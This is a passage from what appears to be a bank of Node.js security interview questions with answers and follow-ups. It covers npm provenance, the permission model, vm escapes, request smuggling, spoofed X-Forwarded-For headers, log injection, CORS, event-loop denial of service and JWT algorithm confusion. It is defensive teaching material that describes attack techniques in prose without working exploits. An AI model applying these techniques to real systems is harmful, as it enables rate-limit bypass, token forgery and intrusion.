Answer: Require publish 2FA, use a token that can publish only one package, and expire CI tokens with the job. A long-lived `NPM_TOKEN` in a world-readable environment is the prize. Provenance on your own publishes, plus a proxy that delays brand-new public packages, gives you time to hear about a hijack before CI installs it.

### NODE-387 — Provenance and registry signatures

**Difficulty:** Intermediate

**Category:** Supply chain

**Question:**

What do npm provenance and `npm audit signatures` guarantee with the npm that ships with Node 20 and 22?

**Answer:**

Registry signatures, which `npm audit signatures` checks, show that the tarball matches what the npm registry signed. They do not show the code is benign. A hijacked maintainer can publish malware and the registry will sign that version too. Provenance, from `npm publish --provenance`, ties the tarball to a public CI run, usually through GitHub Actions and Sigstore. You can see which workflow built it. A laptop publish that skipped the flag has no provenance. Require it for your own packages. The lockfile `integrity` hash is still what detects tampering of a tarball you already pinned.

**Follow-up:**

The package has provenance and a clean audit, and `postinstall` curls a URL. Is that fine?

Answer: No. Provenance names the CI that built the tarball and does not bless a `postinstall` that downloads code. If the package ships prebuilds, ignore scripts, and pin the hash of any binary you still accept.

### NODE-388 — The permission model at a high level

**Difficulty:** Junior

**Category:** Permission model

**Question:**

What does Node's permission model do on Node 22, and how do you turn it on in Node 20?

**Answer:**

It is an allowlist for sensitive operations inside one Node process. On Node 22 you start it with `node --permission`. On Node 20 the same model is `node --experimental-permission`. Without a grant, filesystem reads and writes, child processes, and worker threads fail with `ERR_ACCESS_DENIED`. Open only what you need: `--allow-fs-read` for a data directory, `--allow-fs-write` for a temp directory, and child-process or worker grants only when a feature truly needs them. `process.permission.has('fs.read', filePath)` lets application code fail closed before it touches the disk.

**Follow-up:**

What does `--allow-fs-read=*` mean in practice?

Answer: It allows every path the operating-system user can read, so the filesystem half of the policy no longer limits a traversal bug. Grant the smallest directory that works, and a write directory that is not the application source. Write access to the app directory means a bug can overwrite your code and survive a restart.

### NODE-389 — What the permission model does not stop

**Difficulty:** Senior

**Category:** Permission model

**Question:**

Why is `--permission` not a sandbox you can point at untrusted code and forget?

**Answer:**

It constrains Node APIs it knows about in the current process. It is not a kernel sandbox. If you pass `--allow-child-process`, the child is a new process and does not inherit your grants unless you arrange that. Native addons run native code in-process. A debug port is a remote control plane if an attacker can reach it. A broad filesystem grant empties the control. Keep a container, a non-root user, and a read-only root filesystem, and treat `--permission` as one more layer.

**Follow-up:**

How would you run a user-supplied plugin under this model?

Answer: Run it in a separate `node --permission` process, with no child-process grant and no write access to the app, and talk to it over a narrow protocol. Put that process in a container with no default route if it should not use the network.

### NODE-390 — `node:vm` is not a sandbox

**Difficulty:** Intermediate

**Category:** Dynamic code

**Question:**

Node's docs say `node:vm` is not a security mechanism. What does that mean for `runInNewContext`?

**Answer:**

`vm.runInNewContext(code, sandbox)` runs in the same process, with the same machine privileges as your server. The sandbox object is a realm, not a security boundary. Untrusted code can reach the host through objects you passed in and through the language itself. A known illustration walks `constructor` until it obtains the `Function` constructor, then returns `process`. From there it can load `node:child_process` when the module system is reachable. Individual breakouts get patched and new ones appear. The supported advice is to keep untrusted code out of `vm`, and to use it for trusted code you wrote, such as a test harness.

**Follow-up:**

What do you use if the product must run tenant JavaScript?

Answer: If the product truly requires it, use a separate V8 isolate with memory and CPU limits, or a separate process with `--permission` inside a container. Pass JSON in, and do not pass `require` or `process` into that context.

### NODE-391 — `eval`, `new Function`, and dynamic `require`

**Difficulty:** Intermediate

**Category:** Dynamic code

**Question:**

Why are `eval`, `new Function`, and `require(userInput)` the same class of bug on a server?

**Answer:**

All three execute attacker-chosen code with the process's rights. `eval` and `new Function` compile a string in the current realm. `require` of a user path, or a dynamic `import` of one, loads any module the process can read, including `node:child_process`, or a file the attacker wrote under `/tmp`. A template engine that compiles a user template into a function is the same pattern with a library in front. Ban `eval` and `new Function` on request data in lint, and review the exceptions. An admin screen that runs a snippet is a remote shell.

**Follow-up:**

A chart stores a function body and runs `new Function('data', body)`. What do you replace it with?

Answer: Store a name and look it up in a map of functions you wrote. If users need expressions, parse a tiny grammar of numbers, field names, and arithmetic that cannot call anything, and keep `eval` out of that parser.

### NODE-392 — HTTP request smuggling in concept

**Difficulty:** Intermediate

**Category:** Request smuggling

**Question:**

What is HTTP request smuggling, and how does a Node app behind a proxy get involved?

**Answer:**

Smuggling happens when the front proxy and Node disagree about where one HTTP/1.1 request ends. The usual ambiguity is both `Content-Length` and `Transfer-Encoding` on the same message, or two content lengths. The proxy forwards one stream and Node parses two requests, or the reverse. The hidden request can stick to the next user's connection, poisoning a cache or capturing the next request's cookies. This is a parser disagreement, not a bug in your route. Node's default parser rejects many ambiguous messages. The dangerous choice is opting into lenient parsing, so keep the proxy and Node current.

**Follow-up:**

A scanner reports possible smuggling and the app still works. What do you check?

Answer: Confirm `insecureHTTPParser` is off on the server and on outbound `http.request`, and confirm the proxy rejects conflicting `Content-Length` and `Transfer-Encoding`. Capture one raw request the scanner sent and see which hop accepted it.

### NODE-393 — Lenient parsing and slow clients

**Difficulty:** Senior

**Category:** Request smuggling

**Question:**

Which Node HTTP server options weaken framing checks or let a slow client hold sockets?

**Answer:**

`insecureHTTPParser: true` accepts header and framing shapes the strict parser rejects. That is how you recreate smuggling conditions next to a proxy that parses differently. Leave it false. Separately, a client that dribbles headers one byte at a time holds a socket. On Node 20 and 22, `headersTimeout` defaults to 60 seconds and `requestTimeout` defaults to 5 minutes. Setting either to `0` disables that timer, so keep both finite. `keepAliveTimeout` defaults to 5 seconds, and `headersTimeout` should stay greater than it.

**Follow-up:**

The load balancer idles at 60 seconds, Node's `keepAliveTimeout` is 5 seconds, and users see intermittent 502s. What do you change?

Answer: Raise `keepAliveTimeout` above the balancer's idle time, for example to 65 seconds, and set `headersTimeout` above that. Leave `requestTimeout` finite so a body that never finishes is dropped, and leave `insecureHTTPParser` off. It weakens framing and does not fix the 502s.

### NODE-394 — Rate limits across more than one process

**Difficulty:** Intermediate

**Category:** Rate limiting

**Question:**

How do you rate-limit a Node API that runs several instances, and which routes go first?

**Answer:**

Start with login, password reset, token exchange, and anything that runs `bcrypt` or `scrypt`. Check the limit before the password hash, or the hash itself becomes the denial of service. An in-memory counter is per process. Eight workers means about eight times the budget, and a deploy wipes the counters. Use a shared store such as Redis so the key is global. Key by account and IP together. IP alone punishes users behind carrier NAT, and attackers rotate addresses. Return `429` with `Retry-After`. Put a coarse limit at the edge proxy and a tighter one in the app.

**Follow-up:**

What do you want to happen when Redis is down?

Answer: Choose it explicitly. Failing open keeps the site up and disables the control, while failing closed protects passwords and causes an outage. A small in-process fallback is a middle path, and you should log which mode you are in.

### NODE-395 — `trust proxy` and spoofed client IPs

**Difficulty:** Senior

**Category:** Rate limiting

**Question:**

Login limits are keyed by `req.ip`, and an attacker bypasses them with a header. What is wrong?

**Answer:**

Express trusts `X-Forwarded-For` only when `trust proxy` is enabled. `app.set('trust proxy', true)` means trust every hop, so the client sends `X-Forwarded-For: 1.2.3.4` and `req.ip` becomes whatever they chose. They rotate the header and never hit the limit. Set `trust proxy` to the hop count in front of Node, or to the proxy address. Express then takes `req.ip` from the hop you control. The same setting fixes `req.protocol` behind TLS termination. A wrong value also poisons audit logs, because you record the attacker's chosen address.

**Follow-up:**

The app sits behind Cloudflare and an internal nginx. How do you pick the hop count?

Answer: Count proxies that append to `X-Forwarded-For` and that Node actually talks to. If nginx overwrites the header, trust one hop, and if both append, the count is two. Prefer a known proxy address over `true`, and document the chain next to `app.set`.

### NODE-396 — Logging secrets and personal data

**Difficulty:** Intermediate

**Category:** Logging

**Question:**

What should a Node access log contain, and which fields are secrets or personal data?

**Answer:**

Log a request id, method, route template, status, latency, and a stable user id when you have one. Prefer `/users/:id` over a raw URL if the URL can carry a token. Treat `Authorization`, `Cookie`, `Set-Cookie`, auth-route bodies, passwords, refresh tokens, and session ids as secret. Email and IP addresses are personal data. Keep them only with a reason and a retention window. In pino, set `redact` paths for `req.headers.authorization`, `req.headers.cookie`, and `req.body.password`. Redact in the logger so every call site inherits it, and do not `console.log(req)` in production.

**Follow-up:**

An exception reporter uploads the request on every 500. What do you change?

Answer: In a before-send hook, drop `authorization`, `cookie`, `set-cookie`, and the body on login and reset routes. Keep the route name and request id, then read one real event and look for `Bearer` and `password`. A reporter that bypasses pino will not see pino's redact list.

### NODE-397 — Log injection

**Difficulty:** Intermediate

**Category:** Logging

**Question:**

A username of `alice`, then a newline, then `level=error user=admin`, shows up as two events. What happened?

**Answer:**

The log line is plain text, and the username contained a newline. The downstream parser split on that newline and recorded a forged event. That misleads incident response and can hide the real line. If the log UI renders messages as HTML, the same field is stored XSS against operators. Write JSON logs so a newline stays inside a string. Pino does this. If any sink is still plain text, strip carriage returns and newlines from user fields before you format the line.

**Follow-up:**

Which characters do you still worry about once logs are JSON?

Answer: A correct serializer already escapes quotes and control characters, so use it and do not prefix a raw string in front of the JSON. Cap field length, and test a value that contains a newline, a quote, and a script tag.

### NODE-398 — Security headers, and how CORS differs

**Difficulty:** Intermediate

**Category:** Security headers

**Question:**

Which response headers do you want on a Node API even when Helmet is only partly configured, and how is CORS different?

**Answer:**

Set `X-Content-Type-Options: nosniff`, a strict `Referrer-Policy`, and `Cache-Control: no-store` on authenticated responses so shared caches do not keep tokens. On HTML pages, add framing protection with `X-Frame-Options` and CSP `frame-ancestors`. `Permissions-Policy` can turn off camera, microphone, and geolocation when you do not use them. CORS is a browser rule about which other origins may read a response. `Access-Control-Allow-Origin: *` cannot be combined with credentialed cookies. Reflecting the request `Origin` while credentials are allowed lets any website read the response with the user's cookies. Allowlist origins exactly. Non-browser clients ignore CORS, so it is not authentication on the route.

**Follow-up:**

A mobile app and a partner backend "need `Access-Control-Allow-Origin: *`." What do you tell them?

Answer: Those clients are not subject to CORS, and `*` widens browser access if any route uses cookies. Let the mobile app send a bearer token and the partner use mTLS or a server-side key. If a browser app needs the API, allow that one origin and do not reflect arbitrary `Origin` values.

### NODE-399 — Event-loop denial of service and JSON bombs

**Difficulty:** Senior

**Category:** Denial of service

**Question:**

How does an attacker deny service to one Node 20 or 22 process without a bandwidth flood?

**Answer:**

They keep the single event-loop thread busy, or they force a memory spike. `fs.readFileSync`, `crypto.pbkdf2Sync`, synchronous scrypt, and synchronous compression of a large buffer block every other request on that process. `JSON.parse` of a huge body does the same. A size limit is necessary and not sufficient. `express.json({ limit: '100kb' })` stops a wide payload, and a 100kb body of deeply nested arrays can still burn CPU or blow the stack. Inflating gzip before you cap bytes has the same shape. Stream uploads to storage with a byte cap, and keep the request timers finite.

**Follow-up:**

What do you put in front of `bcrypt` on login so the hash cannot be the bottleneck?

Answer: Apply the rate limit and a maximum password length before `bcrypt.compare`. Bcrypt only uses the first 72 bytes, and a huge password still costs time if you accept it, so reject absurd lengths with a 400 and use the async API.

### NODE-400 — JWT pitfalls at the HTTP layer

**Difficulty:** Senior

**Category:** JWT

**Question:**

A Node API accepts a JWT on each request. Which HTTP-layer mistakes make that token forgeable, replayable, or impossible to revoke?

**Answer:**

A JWT is a bearer secret. Anyone who can read it can replay it until it expires, so verify the signature. `decode` only base64url-decodes the payload. Pin the algorithm, such as `algorithms: ['RS256']`, and check `iss`, `aud`, `exp`, and `nbf`. The payload is readable, so keep secrets out of claims unless you use JWE. Keep the token out of the query string, because logs and `Referer` will store it. A long expiry with no denylist means logout does nothing. Use a short access token and rotate refresh tokens. JavaScript-readable storage is stealable by XSS, and cookie storage brings CSRF back.

**Follow-up:**

What is the RS256 versus HS256 mix-up, and what goes wrong with `kid` or `jku`?

Answer: If the server accepts HS256 as well as RS256, an attacker can HMAC-sign the token using the public key as the secret. An allowlist of only RS256 closes that. A trusted `kid` or `jku` lets the token choose the key, so map `kid` to a server-side table and ignore `jku` unless that URL is pinned.
